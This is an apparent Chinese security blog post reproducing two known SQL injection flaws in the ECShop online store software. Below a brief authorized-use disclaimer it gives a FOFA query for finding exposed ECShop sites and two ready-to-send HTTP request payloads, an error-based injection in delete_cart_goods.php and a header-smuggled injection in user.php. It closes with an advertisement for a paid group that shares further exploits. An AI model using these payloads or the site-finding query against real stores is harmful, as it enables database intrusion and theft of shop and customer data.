#  【漏洞复现】（nday）Ecshop两个注入复现   
南极熊  WK安全   2023-11-26 09:27  
  
0x01 阅读须知  
  
**SCA御盾实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
  
**0x02 漏洞描述**  
  
**（一）**  
**Ecshop**  
  
ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。最新版本为4.0.0。ECShop开发了独有的高效模板引擎（2.15以前版本使用smarty模板引擎），并结合了Dreamweaver的模板和库功能，使得编辑制作模板变得更简单。此外，ECShop还具有开放的插件机制、功能AJAX化、促销功能、高效率的代码和执行性能、搜索引擎优化、内置手机短信网关以及多语言支持等多种特色功能。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RxxRc1KlrIjAkwzkLRiadicfEWYXkLwO7Fs36bZhaJTJ8ibBDbW7Gj4TDl8kBicQJbvbqn4qM84iafgHJhkiboAA1XIw/640?wx_fmt=jpeg&from=appmsg "")  
  
fofa语法：  
```
app="ECShop"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RxxRc1KlrIjAkwzkLRiadicfEWYXkLwO7Ftgz41gnpBnibqksudc2V6TWHZJJJ8P09t1OfpOoTNices2nMNYXicgFOg/640?wx_fmt=png&from=appmsg "")  
  
（二） 漏洞复现   
  
注入1：  
```
POST /delete_cart_goods.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Content-Type: application/x-www-form-urlencoded

id=0||(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RxxRc1KlrIjAkwzkLRiadicfEWYXkLwO7FvsBsL5EnwFiatWJOBsQ8NVX4FrTOHAOsK3uZ72a97cricEWFdf28c36A/640?wx_fmt=png&from=appmsg "")  
  
注入2（后台注入）：  
```
POST /user.php?act=collection_list HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
X-Forwarded-Host': '45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(user(),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
Cookie:ECS_ID={{ecsid}}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RxxRc1KlrIjAkwzkLRiadicfEWYXkLwO7FxpRRxkaTmRMGQYD33W8ibMGBFq1UO7OoRHMAb8ZxWOpgOPoLWnkBUYg/640?wx_fmt=png&from=appmsg "")  
  
**技术交流可加下方wx**  
  
****  
**|**  
**知识星球的介绍**  
  
不好意思，兄弟们，这里给湘安无事星球打个广告，不喜欢的可以直接滑走哦。添加下面wx加星球可享优惠  
  
1.群主为什么要建知识星球？  
```
很简单为了恰饭哈哈哈，然后也是为了建立一个圈子进行交流学习和共享资源嘛
相应的也收取费用嘛，毕竟维持星球也需要精力
```  
  
2.知识星球有哪些资源？  
```
群里面联系群主是可以要一些免费的学习资料的，因为群里面大部分是大学生嘛
大学生不就是喜欢白嫖，所以大家会共享一些资料
没有的群主wk也有,wk除了不会pc,其他都能嫖hhh
```  
  
一些实战报告，截的部分  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62RcLSRwZcEVNtIZkzdBc6oFT9jYPTSicI2dfuibvXY2XkqPEcmFtWPIxw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62RB3woW60WbOxWFuYycTic8ltSWVvXRCHcpLIfl3tnaUI4rArq2YTPhw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62TzMgcj8bnia1VDlFiaE5HHo8DGBibrfGYLJibnlEZ8MaJD1H5bNjUM4WiaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
一些1day的poc,这些也就是信息差，不想找可以让wk帮你们嫖,群主也会经常发  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62u6rIc801vEhGFYFsVtzrSKobQpybfzZvtmwOUjLStelMbJ5yg3Ouow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62oKLUAWOIwkcYbWfmE1JNBma2h9sEsJz7T6SRBOqz72gz9Cy0K7rlyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62vibbG0Nu1NhibkJcshXVDrklAYuXlTIK7Frkia05hmQZRAXEgpxF0MHOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
一些共享的资源  
```
1.刀客源码的会员
2.fofa 360高级会员
3.专属漏洞库
5.专属内部it免费课程
6.不定期直播分享（星球有录屏）
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/S2ssjS1jNYvS1u1PKCurEmuM61nGSElnNalHCy4YicPa9bZ23vMDPHzQPDxybG50b760tL8KcAYTGjBicGocsdXw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/S2ssjS1jNYuCJm1WAIhc9XAa6OLI3ryvT32RpoHYTibSMVnsTh875E0Jk4XPduRqDicRQGMWHDD4RnueHudPHI3g/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/1qkgPBQslIGDE39LQeXXicdKp3XFzjMS27ufaXu0zDItWnC9MmqzdGGPOTZbN0EQTklLKlicYx9sLQrBaeZV5D6g/640?wx_fmt=jpeg&from=appmsg "")  
****  
